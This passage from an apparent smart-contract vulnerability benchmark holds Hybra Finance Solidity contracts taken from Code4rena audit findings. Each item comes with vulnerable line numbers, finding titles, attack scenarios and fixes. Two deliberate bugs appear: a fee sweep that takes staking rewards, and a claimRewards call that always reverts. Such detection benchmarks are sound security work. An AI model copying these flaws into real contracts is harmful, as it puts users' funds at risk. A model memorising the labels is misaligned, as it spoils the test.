(reward); // bonsReward is 0 for now\r\n    }\r\n\r\n       function _earned(uint256 tokenId) internal view returns (uint256) {\r\n        uint256 lastUpdated = clPool.lastUpdated();\r\n\r\n        uint256 timeDelta = block.timestamp - lastUpdated;\r\n\r\n        \r\n        uint256 rewardGrowthGlobalX128 = clPool.rewardGrowthGlobalX128();\r\n        uint256 rewardReserve = clPool.rewardReserve();\r\n\r\n        if (timeDelta != 0 && rewardReserve > 0 && clPool.stakedLiquidity() > 0) {\r\n            uint256 reward = rewardRate * timeDelta;\r\n            if (reward > rewardReserve) reward = rewardReserve;\r\n\r\n            rewardGrowthGlobalX128 += FullMath.mulDiv(reward, FixedPoint128.Q128, clPool.stakedLiquidity());\r\n        }\r\n\r\n        (,,,,, int24 tickLower, int24 tickUpper, uint128 liquidity,,,,) = nonfungiblePositionManager.positions(tokenId);\r\n\r\n        uint256 rewardPerTokenInsideInitialX128 = rewardGrowthInside[tokenId];\r\n        uint256 rewardPerTokenInsideX128 = clPool.getRewardGrowthInside(tickLower, tickUpper, rewardGrowthGlobalX128);\r\n\r\n        uint256 claimable =\r\n            FullMath.mulDiv(rewardPerTokenInsideX128 - rewardPerTokenInsideInitialX128, liquidity, FixedPoint128.Q128);\r\n        return claimable;\r\n    }\r\n\r\n    function deposit(uint256 tokenId) external nonReentrant isNotEmergency {\r\n        \r\n         (,,address token0, address token1, int24 tickSpacing, int24 tickLower, int24 tickUpper, uint128 liquidity,,,,) = \r\n            nonfungiblePositionManager.positions(tokenId);\r\n        \r\n        require(liquidity > 0, \"Gauge: zero liquidity\");\r\n        // Calculate pool address from position parameters\r\n        address positionPool = _getPoolAddress(token0, token1, tickSpacing);\r\n        // Verify that the position's pool matches this gauge's pool\r\n        require(positionPool == poolAddress, \"Pool mismatch: Position not for this gauge pool\");\r\n        // collect fees \r\n        nonfungiblePositionManager.collect(INonfungiblePositionManager.CollectParams({\r\n                tokenId: tokenId,\r\n                recipient: msg.sender,\r\n                amount0Max: type(uint128).max,\r\n                amount1Max: type(uint128).max\r\n            }));\r\n\r\n        nonfungiblePositionManager.safeTransferFrom(msg.sender, address(this), tokenId);\r\n\r\n        clPool.stake(int128(liquidity), tickLower, tickUpper, true);\r\n\r\n\r\n        uint256 rewardGrowth = clPool.getRewardGrowthInside(tickLower, tickUpper, 0);\r\n        rewardGrowthInside[tokenId] = rewardGrowth;\r\n        lastUpdateTime[tokenId] = block.timestamp;\r\n\r\n        _stakes[msg.sender].add(tokenId);\r\n\r\n        emit Deposit(msg.sender, tokenId);\r\n    }\r\n\r\n    function withdraw(uint256 tokenId, uint8 redeemType) external nonReentrant isNotEmergency {\r\n           require(_stakes[msg.sender].contains(tokenId), \"NA\");\r\n\r\n        // trigger update on staked position so NFT will be in sync with the pool\r\n        nonfungiblePositionManager.collect(\r\n            INonfungiblePositionManager.CollectParams({\r\n                tokenId: tokenId,\r\n                recipient: msg.sender,\r\n                amount0Max: type(uint128).max,\r\n                amount1Max: type(uint128).max\r\n            })\r\n        );\r\n\r\n        (,,,,, int24 tickLower, int24 tickUpper, uint128 liquidityToStake,,,,) = nonfungiblePositionManager.positions(tokenId);\r\n        _getReward(tickLower, tickUpper, tokenId, msg.sender, redeemType);\r\n\r\n        // update virtual liquidity in pool only if token has existing liquidity\r\n        // i.e. not all removed already via decreaseStakedLiquidity\r\n        if (liquidityToStake != 0) {\r\n            clPool.stake(-int128(liquidityToStake), tickLower, tickUpper, true);\r\n        }\r\n\r\n        _stakes[msg.sender].remove(tokenId);\r\n        nonfungiblePositionManager.safeTransferFrom(address(this), msg.sender, tokenId);\r\n\r\n        emit Withdraw(msg.sender, tokenId);\r\n    }\r\n\r\n    \r\n\r\n    function getReward(uint256 tokenId, address account,uint8 redeemType ) public nonReentrant onlyDistribution {\r\n\r\n        require(_stakes[account].contains(tokenId), \"NA\");\r\n\r\n        (,,,,, int24 tickLower, int24 tickUpper,,,,,) = nonfungiblePositionManager.positions(tokenId);\r\n        _getReward(tickLower, tickUpper, tokenId, account, redeemType);\r\n    }\r\n\r\n\r\n    function _getReward(int24 tickLower, int24 tickUpper, uint256 tokenId,address account, uint8 redeemType) internal {\r\n        _updateRewards(tokenId, tickLower, tickUpper);\r\n        uint256 rewardAmount = rewards[tokenId];\r\n        if(rewardAmount > 0){\r\n            delete rewards[tokenId];\r\n            rewardToken.safeApprove(rHYBR, rewardAmount);\r\n            IRHYBR(rHYBR).depostionEmissionsToken(rewardAmount);\r\n            IRHYBR(rHYBR).redeemFor(rewardAmount, redeemType, account);\r\n        }\r\n        emit Harvest(msg.sender, rewardAmount);\r\n    }\r\n\r\n    function notifyRewardAmount(address token, uint256 rewardAmount) external nonReentrant\r\n        isNotEmergency onlyDistribution returns (uint256 currentRate) {\r\n        require(token == address(rewardToken), \"Invalid reward token\");\r\n\r\n        // Update global reward growth before processing new rewards\r\n        clPool.updateRewardsGrowthGlobal();\r\n\r\n        // Calculate time remaining until next epoch begins\r\n        uint256 epochTimeRemaining = HybraTimeLibrary.epochNext(block.timestamp) - block.timestamp;\r\n        uint256 epochEndTimestamp = block.timestamp + epochTimeRemaining;\r\n\r\n        // Include any rolled over rewards from previous period\r\n        uint256 totalRewardAmount = rewardAmount + clPool.rollover();\r\n\r\n        // Check if we are starting a new reward period or continuing existing one\r\n        if (block.timestamp >= _periodFinish) {\r\n            // New period: distribute rewards over remaining epoch time\r\n            rewardRate = rewardAmount / epochTimeRemaining;\r\n            clPool.syncReward({\r\n                rewardRate: rewardRate,\r\n                rewardReserve: totalRewardAmount,\r\n                periodFinish: epochEndTimestamp\r\n            });\r\n        } else {\r\n            // Existing period: add new rewards to pending distribution\r\n            uint256 pendingRewards = epochTimeRemaining * rewardRate;\r\n            rewardRate = (rewardAmount + pendingRewards) / epochTimeRemaining;\r\n            clPool.syncReward({\r\n                rewardRate: rewardRate,\r\n                rewardReserve: totalRewardAmount + pendingRewards,\r\n                periodFinish: epochEndTimestamp\r\n            });\r\n        }\r\n\r\n        // Store reward rate for current epoch tracking\r\n        rewardRateByEpoch[HybraTimeLibrary.epochStart(block.timestamp)] = rewardRate;\r\n\r\n        // Transfer reward tokens from distributor to gauge\r\n        rewardToken.safeTransferFrom(DISTRIBUTION, address(this), rewardAmount);\r\n\r\n        // Verify contract has sufficient balance to support calculated reward rate\r\n        uint256 contractBalance = rewardToken.balanceOf(address(this));\r\n        require(rewardRate <= contractBalance / epochTimeRemaining, \"Insufficient balance for reward rate\");\r\n\r\n        // Update period finish time and return current rate\r\n        _periodFinish = epochEndTimestamp;\r\n        currentRate = rewardRate;\r\n\r\n        emit RewardAdded(rewardAmount);\r\n    }\r\n\r\n    function gaugeBalances() external view returns (uint256 token0, uint256 token1){\r\n        \r\n        (token0, token1) = clPool.gaugeFees();\r\n\r\n    }\r\n\r\n  \r\n\r\n\r\n\r\n    function claimFees() external nonReentrant returns (uint256 claimed0, uint256 claimed1) {\r\n        return _claimFees();\r\n    }\r\n\r\n    function _claimFees() internal returns (uint256 claimed0, uint256 claimed1) {\r\n        if (!isForPair) {\r\n            return (0, 0);\r\n        }\r\n        \r\n        clPool.collectFees();\r\n        \r\n        address _token0 = clPool.token0();\r\n        address _token1 = clPool.token1();\r\n        // Fetch fee from the whole epoch which just eneded and transfer it to internal Bribe address.\r\n        claimed0 = IERC20(_token0).balanceOf(address(this));\r\n        claimed1 = IERC20(_token1).balanceOf(address(this));\r\n\r\n        if (claimed0 > 0 || claimed1 > 0) {\r\n    \r\n\r\n            uint256 _fees0 = claimed0;\r\n            uint256 _fees1 = claimed1;\r\n\r\n            if (_fees0  > 0) {\r\n                IERC20(_token0).safeApprove(internal_bribe, 0);\r\n                IERC20(_token0).safeApprove(internal_bribe, _fees0);\r\n                IBribe(internal_bribe).notifyRewardAmount(_token0, _fees0);\r\n            } \r\n            if (_fees1  > 0) {\r\n                IERC20(_token1).safeApprove(internal_bribe, 0);\r\n                IERC20(_token1).safeApprove(internal_bribe, _fees1);\r\n                IBribe(internal_bribe).notifyRewardAmount(_token1, _fees1);\r\n            } \r\n            emit ClaimFees(msg.sender, claimed0, claimed1);\r\n        }\r\n    }\r\n\r\n    ///@notice get total reward for the duration\r\n    function rewardForDuration() external view returns (uint256) {\r\n        return rewardRate * DURATION;\r\n    }\r\n\r\n    ///@notice set new internal bribe contract (where to send fees)\r\n    function setInternalBribe(address _int) external onlyOwner {\r\n        require(_int >= address(0), \"zero\");\r\n        internal_bribe = _int;\r\n    }\r\n\r\n    function _safeTransfer(address token,address to,uint256 value) internal {\r\n        require(token.code.length > 0);\r\n        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(IERC20.transfer.selector, to, value));\r\n        require(success && (data.length == 0 || abi.decode(data, (bool))));\r\n    }\r\n\r\n    /**\r\n     * @dev Handle the receipt of an NFT\r\n     * @param operator The address which called `safeTransferFrom` function\r\n     * @param from The address which previously owned the token\r\n     * @param tokenId The NFT identifier which is being transferred\r\n     * @param data Additional data with no specified format\r\n     * @return bytes4 `bytes4(keccak256(\"onERC721Received(address,address,uint256,bytes)\"))`\r\n     */\r\n    function onERC721Received(\r\n        address operator,\r\n        address from,\r\n        uint256 tokenId,\r\n        bytes calldata data\r\n    ) external pure override returns (bytes4) {\r\n        return IERC721Receiver.onERC721Received.selector;\r\n    }\r\n\r\n}\r\n\r\n",
            "vulnerable_lines": [
                304,
                305,
                306,
                307,
                308,
                309,
                310,
                311,
                312,
                313,
                314,
                315,
                316,
                317,
                318,
                319,
                320,
                321,
                322,
                323,
                324,
                325,
                326,
                327,
                328,
                329,
                330,
                331,
                332,
                333,
                334,
                335
            ],
            "vulnerable_functions": [
                "_claimFees",
                "claimFees"
            ]
        },
        "context_files": [],
        "call_flow": "collectFees() -> _claimFees() -> transfer full balance to bribe (includes rewards)",
        "context_hint": "Fee claiming sweeps all token balances, including unrelated staking rewards, to the bribe recipient.",
        "is_vulnerable": true
    },
    {
        "id": "gs_c4_2025-10-hybra-finance_M07",
        "subset": "gold_standard",
        "language": "solidity",
        "chain": "ethereum",
        "source_platform": "code4rena",
        "source_report": "2025-10-hybra-finance",
        "source_finding_id": "M-07",
        "report_url": "https://code4rena.com/reports/2025-10-hybra-finance",
        "github_repo_url": "https://github.com/code-423n4/2025-10-hybra-finance",
        "contest_date": "2025-10-06",
        "severity": "medium",
        "vulnerability_type": "logic_error",
        "difficulty_tier": 1,
        "context_level": "multi_file",
        "finding_title": "Claiming rewards in GovernanceHYBR will always revert",
        "finding_description": "`claimRewards()` uses `IVoter.poolVote(veTokenId)` incorrectly; `poolVote` is a mapping, not a function returning an array, causing a revert.",
        "attack_scenario": "A test votes on pools, warps time, and `claimRewards()` reverts due to invalid getter call.",
        "fix_description": "Add `getPoolVote(veTokenId)` in `VoterV3.sol` to return the array. Status: Mitigation confirmed.",
        "primary_file": {
            "path": "ve33/contracts/GovernanceHYBR.sol",
            "content": "// SPDX-License-Identifier: MIT\r\npragma solidity 0.8.13;\r\n\r\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\r\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\r\nimport \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\r\nimport \"./interfaces/IVotingEscrow.sol\";\r\nimport \"./interfaces/IVoter.sol\";\r\nimport \"./interfaces/IBribe.sol\";\r\nimport \"./interfaces/IRewardsDistributor.sol\";\r\nimport \"./interfaces/IGaugeManager.sol\";\r\nimport \"./interfaces/ISwapper.sol\";\r\nimport {HybraTimeLibrary} from \"./libraries/HybraTimeLibrary.sol\";\r\nimport \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\r\n\r\n/**\r\n * @title GovernanceHYBR (gHYBR)\r\n * @notice Auto-compounding staking token that locks HYBR as veHYBR and compounds rewards\r\n * @dev Implements transfer restrictions for new deposits and automatic reward compounding\r\n */\r\ncontract GrowthHYBR is ERC20, Ownable, ReentrancyGuard {\r\n    using SafeERC20 for IERC20;\r\n    // Lock period for new deposits (configurable between 12-24 hours)\r\n    uint256 public transferLockPeriod = 24 hours;\r\n    uint256 public constant MIN_LOCK_PERIOD = 1 minutes;\r\n    uint256 public constant MAX_LOCK_PERIOD = 240 minutes;\r\n    uint256 public head_not_withdraw_time = 1200; // 5days\r\n    uint256 public tail_not_withdraw_time = 300; // 1day\r\n  \r\n    // Withdraw fee configuration (basis points, 10000 = 100%)\r\n    uint256 public withdrawFee = 100; // 1% default fee\r\n    uint256 public constant MIN_WITHDRAW_FEE = 10; // 0.1% minimum\r\n    uint256 public constant MAX_WITHDRAW_FEE = 1000; // 10% maximum\r\n    uint256 public constant BASIS = 10000;\r\n    address public Team; // Address to receive fees\r\n    uint256 public rebase;\r\n    uint256 public penalty;\r\n    uint256 public votingYield;\r\n    // User deposit tracking for transfer locks\r\n    struct UserLock {\r\n        uint256 amount;\r\n        uint256 unlockTime;\r\n    }\r\n    \r\n    mapping(address => UserLock[]) public userLocks;\r\n    mapping(address => uint256) public lockedBalance;\r\n    \r\n    // Core contracts\r\n    address public immutable HYBR;\r\n    address public immutable votingEscrow;\r\n    address public voter;\r\n    address public rewardsDistributor;\r\n    address public gaugeManager;\r\n    uint256 public veTokenId; // The veNFT owned by this contract\r\n    \r\n    // Auto-voting strategy\r\n    address public operator; // Address that can manage voting strategy\r\n    uint256 public lastVoteEpoch; // Last epoch when we voted\r\n    \r\n    // Reward tracking\r\n    uint256 public lastRebaseTime;\r\n    uint256 public lastCompoundTime;\r\n\r\n    // Swap module\r\n    ISwapper public swapper;\r\n\r\n    // Errors\r\n    error NOT_AUTHORIZED();\r\n    \r\n    // Events\r\n    event Deposit(address indexed user, uint256 hybrAmount, uint256 sharesReceived);\r\n    event Withdraw(address indexed user, uint256 shares, uint256 hybrAmount, uint256 fee);\r\n    event Compound(uint256 rewards, uint256 newTotalLocked);\r\n    event PenaltyRewardReceived(uint256 amount);\r\n    event TransferLockPeriodUpdated(uint256 oldPeriod, uint256 newPeriod);\r\n    event SwapperUpdated(address indexed oldSwapper, address indexed newSwapper);\r\n    event VoterSet(address voter);\r\n    event EmergencyUnlock(address indexed user);\r\n    event AutoVotingEnabled(bool enabled);\r\n    event OperatorUpdated(address indexed oldOperator, address indexed newOperator);\r\n    event DefaultVotingStrategyUpdated(address[] pools, uint256[] weights);\r\n    event AutoVoteExecuted(uint256 epoch, address[] pools, uint256[] weights);\r\n\r\n    constructor(\r\n        address _HYBR,\r\n        address _votingEscrow\r\n    ) ERC20(\"Growth HYBR\", \"gHYBR\") {\r\n        require(_HYBR != address(0), \"Invalid HYBR\");\r\n        require(_votingEscrow != address(0), \"Invalid VE\");\r\n        \r\n        HYBR = _HYBR;\r\n        votingEscrow = _votingEscrow;\r\n        lastRebaseTime = block.timestamp;\r\n        lastCompoundTime = block.timestamp;\r\n        operator = msg.sender; // Initially set deployer as operator\r\n    }\r\n    \r\n    \r\n    function setRewardsDistributor(address _rewardsDistributor) external onlyOwner {\r\n        require(_rewardsDistributor != address(0), \"Invalid rewards distributor\");\r\n        rewardsDistributor = _rewardsDistributor;\r\n    }\r\n    \r\n    function setGaugeManager(address _gaugeManager) external onlyOwner {\r\n        require(_gaugeManager != address(0), \"Invalid gauge manager\");\r\n        gaugeManager = _gaugeManager;\r\n    }\r\n\r\n    \r\n      /**\r\n     * @notice Modifier to check authorization (owner or operator)\r\n     */\r\n    modifier onlyOperator() {\r\n        if (msg.sender != operator) {\r\n            revert NOT_AUTHORIZED();\r\n        }\r\n        _;\r\n    }\r\n    /**\r\n     * @notice Deposit HYBR and receive gHYBR shares\r\n     * @param amount Amount of HYBR to deposit\r\n     * @param recipient Recipient of gHYBR shares\r\n     */\r\n    function deposit(uint256 amount, address recipient) external nonReentrant {\r\n        require(amount > 0, \"Zero amount\");\r\n        recipient = recipient == address(0) ? msg.sender : recipient;\r\n        \r\n        // Transfer HYBR from user first\r\n        IERC20(HYBR).transferFrom(msg.sender, address(this), amount);\r\n        \r\n        // Initialize veNFT on first deposit\r\n        if (veTokenId == 0) {\r\n            _initializeVeNFT(amount);\r\n        } else {\r\n            // Add to existing veNFT\r\n            IERC20(HYBR).approve(votingEscrow, amount);\r\n            IVotingEscrow(votingEscrow).deposit_for(veTokenId, amount);\r\n\r\n            // Extend lock to maximum duration\r\n            _extendLockToMax();\r\n        }\r\n        \r\n        // Calculate shares to mint based on current totalAssets\r\n        uint256 shares = calculateShares(amount);\r\n        \r\n        // Mint gHYBR shares\r\n        _mint(recipient, shares);\r\n        \r\n        // Add transfer lock for recipient\r\n        _addTransferLock(recipient, shares);\r\n        \r\n        emit Deposit(msg.sender, amount, shares);\r\n    }\r\n\r\n    /**\r\n     * @notice Withdraw gHYBR shares and receive a new veNFT with proportional HYBR\r\n     * @dev Creates new veNFT using multiSplit to maintain proportional ownership\r\n     * @param shares Amount of gHYBR shares to burn\r\n     * @return userTokenId The ID of the new veNFT created for the user\r\n     */\r\n    function withdraw(uint256 shares) external nonReentrant returns (uint256 userTokenId) {\r\n        require(shares > 0, \"Zero shares\");\r\n        require(balanceOf(msg.sender) >= shares, \"Insufficient balance\");\r\n        require(veTokenId != 0, \"No veNFT initialized\");\r\n        require(IVotingEscrow(votingEscrow).voted(veTokenId) == false, \"Cannot withdraw yet\");\r\n        \r\n        uint256 epochStart = HybraTimeLibrary.epochStart(block.timestamp);\r\n        uint256 epochNext = HybraTimeLibrary.epochNext(block.timestamp);\r\n\r\n        require(block.timestamp >= epochStart + head_not_withdraw_time && block.timestamp < epochNext - tail_not_withdraw_time, \"Cannot withdraw yet\");\r\n\r\n        // Calculate proportional HYBR amount from veNFT\r\n        uint256 hybrAmount = calculateAssets(shares);\r\n        require(hybrAmount > 0, \"No assets to withdraw\");\r\n\r\n        // Calculate fee amount (from the HYBR amount, not shares)\r\n        uint256 feeAmount = 0;\r\n        if (withdrawFee > 0) {\r\n            feeAmount = (hybrAmount * withdrawFee) / BASIS;\r\n        }\r\n\r\n        // User receives amount minus fee\r\n        uint256 userAmount = hybrAmount - feeAmount;\r\n        require(userAmount > 0, \"Amount too small after fee\");\r\n\r\n        // Get actual HYBR locked amount (not voting power)\r\n        uint256 veBalance = totalAssets();\r\n        require(hybrAmount <= veBalance, \"Insufficient veNFT balance\");\r\n\r\n        uint256 remainingAmount = veBalance - userAmount - feeAmount;  \r\n        require(remainingAmount >= 0, \"Cannot withdraw entire veNFT\");\r\n\r\n        // Burn gHYBR shares (full amount)\r\n        _burn(msg.sender, shares);\r\n\r\n        // Use multiSplit to create two NFTs: one for user, one for contract\r\n        uint256[] memory amounts = new uint256[](3);\r\n        amounts[0] = remainingAmount; // Amount staying with gHYBR \r\n        amounts[1] = userAmount;      // Amount going to user (after fee)\r\n        amounts[2] = feeAmount;      // Amount going to fee recipient\r\n\r\n\r\n        uint256[] memory newTokenIds = IVotingEscrow(votingEscrow).multiSplit(veTokenId, amounts);\r\n    \r\n        // Update contract's veTokenId to the first new token\r\n        veTokenId = newTokenIds[0];\r\n        userTokenId = newTokenIds[1];\r\n        uint256 feeTokenId = newTokenIds[2];\r\n        // Note: userTokenId is transferred to user, they can manage their own lock time\r\n        IVotingEscrow(votingEscrow).safeTransferFrom(address(this), msg.sender, userTokenId);\r\n        IVotingEscrow(votingEscrow).safeTransferFrom(address(this), Team, feeTokenId);\r\n        emit Withdraw(msg.sender, shares, userAmount, feeAmount);\r\n    }\r\n\r\n\r\n    /**\r\n     * @notice Internal function to initialize veNFT on first deposit\r\n     */\r\n    function _initializeVeNFT(uint256 initialAmount) internal {\r\n        // Create max lock with the initial deposit amount\r\n        IERC20(HYBR).approve(votingEscrow, type(uint256).max);\r\n        uint256 lockTime = HybraTimeLibrary.MAX_LOCK_DURATION;\r\n        \r\n        // Create lock with initial amount\r\n        veTokenId = IVotingEscrow(votingEscrow).create_lock_for(initialAmount, lockTime, address(this));\r\n        \r\n    }\r\n    \r\n    /**\r\n     * @notice Calculate shares to mint based on deposit amount\r\n     */\r\n    function calculateShares(uint256 amount) public view returns (uint256) {\r\n        uint256 _totalSupply = totalSupply();\r\n        uint256 _totalAssets = totalAssets();\r\n        if (_totalSupply == 0 || _totalAssets == 0) {\r\n            return amount;\r\n        }\r\n        return (amount * _totalSupply) / _totalAssets;\r\n    }\r\n    \r\n    /**\r\n     * @notice Calculate HYBR value of shares\r\n     */\r\n    function calculateAssets(uint256 shares) public view returns (uint256) {\r\n        uint256 _totalSupply = totalSupply();\r\n        if (_totalSupply == 0) {\r\n            return shares;\r\n        }\r\n        return (shares * totalAssets()) / _totalSupply;\r\n    }\r\n\r\n    \r\n    /**\r\n     * @notice Get total assets (HYBR) locked in veNFT\r\n     * @dev Returns actual HYBR amount, not voting power\r\n     */\r\n    function totalAssets() public view returns (uint256) {\r\n        if (veTokenId == 0) {\r\n            return 0;\r\n        }\r\n        // Get actual locked HYBR amount, not voting power\r\n        IVotingEscrow.LockedBalance memory locked = IVotingEscrow(votingEscrow).locked(veTokenId);\r\n        return uint256(int256(locked.amount));\r\n    }\r\n    \r\n    /**\r\n     * @notice Add transfer lock for new deposits\r\n     */\r\n    function _addTransferLock(address user, uint256 amount) internal {\r\n        uint256 unlockTime = block.timestamp + transferLockPeriod;\r\n        userLocks[user].push(UserLock({\r\n            amount: amount,\r\n            unlockTime: unlockTime\r\n        }));\r\n        lockedBalance[user] += amount;\r\n    }\r\n    \r\n\r\n\r\n    /**\r\n     * @notice Preview available balance (total - currently locked)\r\n     * @param user The user address to check\r\n     * @return available The current available balance for transfer\r\n     */\r\n    function previewAvailable(address user) external view returns (uint256 available) {\r\n        uint256 totalBalance = balanceOf(user);\r\n        uint256 currentLocked = 0;\r\n        \r\n        UserLock[] storage arr = userLocks[user];\r\n        for (uint256 i = 0; i < arr.length; i++) {\r\n            if (arr[i].unlockTime > block.timestamp) {\r\n                currentLocked += arr[i].amount;\r\n            }\r\n        }\r\n        \r\n        return totalBalance > currentLocked ? totalBalance - currentLocked : 0;\r\n    }\r\n    /**\r\n     * @notice Clean expired locks and update locked balance\r\n     * @param user The user address to clean locks for\r\n     * @return freed The amount of tokens freed from expired locks\r\n     */\r\n    function _cleanExpired(address user) internal returns (uint256 freed) {\r\n        UserLock[] storage arr = userLocks[user];\r\n        uint256 len = arr.length;\r\n        if (len == 0) return 0;\r\n\r\n        uint256 write = 0;\r\n        unchecked {\r\n            for (uint256 i = 0; i < len; i++) {\r\n                UserLock memory L = arr[i];\r\n                if (L.unlockTime <= block.timestamp) {\r\n                    freed += L.amount;\r\n                } else {\r\n                    if (write != i) arr[write] = L;\r\n                    write++;\r\n                }\r\n            }\r\n            if (freed > 0) {\r\n                lockedBalance[user] -= freed;\r\n            }\r\n            while (arr.length > write) {\r\n                arr.pop();\r\n            }\r\n        }\r\n    }\r\n    \r\n    \r\n    /**\r\n     * @notice Override transfer to implement lock mechanism\r\n     */\r\n    function _beforeTokenTransfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal override {\r\n        super._beforeTokenTransfer(from, to, amount);\r\n        \r\n        if (from != address(0) && to != address(0)) { // Not mint or burn\r\n            uint256 totalBalance = balanceOf(from);\r\n            \r\n            // Step 1: Check current available balance using cached lockedBalance\r\n            uint256 currentAvailable = totalBalance > lockedBalance[from] ? totalBalance - lockedBalance[from] : 0;\r\n            \r\n            // Step 2: If current available >= amount, pass directly\r\n            if (currentAvailable >= amount) {\r\n                return;\r\n            }\r\n            \r\n            // Step 3: Not enough, clean expired locks and recalculate\r\n            _cleanExpired(from);\r\n            uint256 finalAvailable = totalBalance > lockedBalance[from] ? totalBalance - lockedBalance[from] : 0;\r\n            \r\n            // Step 4: Check final available balance\r\n            require(finalAvailable >= amount, \"Tokens locked\");\r\n        }\r\n    }\r\n    \r\n    /**\r\n     * @notice Claim all rewards from voting and rebase\r\n     */\r\n    function claimRewards() external onlyOperator {\r\n        require(voter != address(0), \"Voter not set\");\r\n        require(rewardsDistributor != address(0), \"Distributor not set\");\r\n              \r\n        // Claim rebase rewards from RewardsDistributor\r\n        uint256  rebaseAmount = IRewardsDistributor(rewardsDistributor).claim(veTokenId);\r\n        rebase += rebaseAmount;\r\n        // Claim bribes from voted pools\r\n        address[] memory votedPools = IVoter(voter).poolVote(veTokenId);\r\n        \r\n        for (uint256 i = 0; i < votedPools.length; i++) {\r\n            if (votedPools[i] != address(0)) {\r\n                address gauge = IGaugeManager(gaugeManager).gauges(votedPools[i]);\r\n                \r\n                if (gauge != address(0)) {\r\n                    // Prepare arrays for single bribe claim\r\n                    address[] memory bribes = new address[](1);\r\n                    address[][] memory tokens = new address[][](1);\r\n                    \r\n                    // Claim internal bribe (trading fees)\r\n                    address internalBribe = IGaugeManager(gaugeManager).internal_bribes(gauge);\r\n                    if (internalBribe != address(0)) {\r\n                        uint256 tokenCount = IBribe(internalBribe).rewardsListLength();\r\n                        if (tokenCount > 0) {\r\n                            address[] memory bribeTokens = new address[](tokenCount);\r\n                            for (uint256 j = 0; j < tokenCount; j++) {\r\n                                bribeTokens[j] = IBribe(internalBribe).bribeTokens(j);\r\n                            }\r\n                            bribes[0] = internalBribe;\r\n                            tokens[0] = bribeTokens;\r\n                            // Call claimBribes for this single bribe\r\n                            IGaugeManager(gaugeManager).claimBribes(bribes, tokens, veTokenId);\r\n                        }\r\n                    }\r\n                    \r\n                    // Claim external bribe\r\n                    address externalBribe = IGaugeManager(gaugeManager).external_bribes(gauge);\r\n                    if (externalBribe != address(0)) {\r\n                        uint256 tokenCount = IBribe(externalBribe).rewardsListLength();\r\n                        if (tokenCount > 0) {\r\n                            address[] memory bribeTokens = new address[](tokenCount);\r\n                            for (uint256 j = 0; j < tokenCount; j++) {\r\n                                bribeTokens[j] = IBribe(externalBribe).bribeTokens(j);\r\n                            }\r\n                            bribes[0] = externalBribe;\r\n                            tokens[0] = bribeTokens;\r\n                            // Call claimBribes for this single bribe\r\n                            IGaugeManager(gaugeManager).claimBribes(bribes, tokens, veTokenId);\r\n                        }\r\n                    }\r\n                }\r\n            }\r\n        }\r\n    }\r\n    \r\n \r\n\r\n    /**\r\n     * @notice Execute swap through the configured swapper module\r\n     * @param _params Swap parameters for the swapper module\r\n     */\r\n    function executeSwap(ISwapper.SwapParams calldata _params) external nonReentrant onlyOperator {\r\n        require(address(swapper) != address(0), \"Swapper not set\");\r\n\r\n        // Get token balance before swap\r\n        uint256 tokenBalance = IERC20(_params.tokenIn).balanceOf(address(this));\r\n        require(tokenBalance >= _params.amountIn, \"Insufficient token balance\");\r\n\r\n        // Approve swapper to spend tokens\r\n        IERC20(_params.tokenIn).safeApprove(address(swapper), _params.amountIn);\r\n\r\n        // Execute swap through swapper module\r\n        uint256 hybrReceived = swapper.swapToHYBR(_params);\r\n\r\n        // Reset approval for safety\r\n        IERC20(_params.tokenIn).safeApprove(address(swapper), 0);\r\n\r\n        // HYBR is now in this contract, ready for compounding\r\n        votingYield += hybrReceived;\r\n    }\r\n    \r\n    /**\r\n     * @notice Compound HYBR balance into veNFT (restricted to authorized users)\r\n     */\r\n    function compound() external onlyOperator {\r\n        \r\n        // Get current HYBR balance\r\n        uint256 hybrBalance = IERC20(HYBR).balanceOf(address(this));\r\n        \r\n        if (hybrBalance > 0) {\r\n            // Lock all HYBR to existing veNFT  \r\n            IERC20(HYBR).safeApprove(votingEscrow, hybrBalance);\r\n            IVotingEscrow(votingEscrow).deposit_for(veTokenId, hybrBalance);\r\n\r\n            // Extend lock to maximum duration\r\n            _extendLockToMax();\r\n\r\n            lastCompoundTime = block.timestamp;\r\n\r\n            emit Compound(hybrBalance, totalAssets());\r\n        }\r\n    }\r\n    \r\n    /**\r\n     * @notice Vote for gauges using the veNFT\r\n     * @param _poolVote Array of pools to vote for\r\n     * @param _weights Array of weights for each pool\r\n     */\r\n    function vote(address[] calldata _poolVote, uint256[] calldata _weights) external {\r\n        require(msg.sender == owner() || msg.sender == operator, \"Not authorized\");\r\n        require(voter != address(0), \"Voter not set\");\r\n        \r\n        IVoter(voter).vote(veTokenId, _poolVote, _weights);\r\n        lastVoteEpoch = HybraTimeLibrary.epochStart(block.timestamp);\r\n        \r\n    }\r\n    \r\n    /**\r\n     * @notice Reset votes\r\n     */\r\n    function reset() external {\r\n        require(msg.sender == owner() || msg.sender == operator, \"Not authorized\");\r\n        require(voter != address(0), \"Voter not set\");\r\n        \r\n        IVoter(voter).reset(veTokenId);\r\n    }\r\n    \r\n    /**\r\n     * @notice Receive penalty rewards from rHYBR conversions\r\n     */\r\n    function receivePenaltyReward(uint256 amount) external {\r\n        \r\n        // Auto-compound penalty rewards to existing veNFT\r\n        if (amount > 0) {\r\n            IERC20(HYBR).approve(votingEscrow, amount);\r\n\r\n            if(veTokenId == 0){\r\n                _initializeVeNFT(amount);\r\n            } else{\r\n                IVotingEscrow(votingEscrow).deposit_for(veTokenId, amount);\r\n\r\n                // Extend lock to maximum duration\r\n                _extendLockToMax();\r\n            }\r\n        }\r\n        penalty += amount;\r\n        emit PenaltyRewardReceived(amount);\r\n    }\r\n       \r\n    /**\r\n     * @notice Set the voter contract\r\n     */\r\n    function setVoter(address _voter) external onlyOwner {\r\n        require(_voter != address(0), \"Invalid voter\");  \r\n        voter = _voter;\r\n        emit VoterSet(_voter);\r\n    }\r\n    \r\n    /**\r\n     * @notice Update transfer lock period\r\n     */\r\n    function setTransferLockPeriod(uint256 _period) external onlyOwner {\r\n        require(_period >= MIN_LOCK_PERIOD && _period <= MAX_LOCK_PERIOD, \"Invalid period\");\r\n        uint256 oldPeriod = transferLockPeriod;\r\n        transferLockPeriod = _period;\r\n        emit TransferLockPeriodUpdated(oldPeriod, _period);\r\n    }\r\n\r\n    /**\r\n     * @notice Set withdraw fee (in basis points)\r\n     * @param _fee Fee amount (10-30 basis points)\r\n     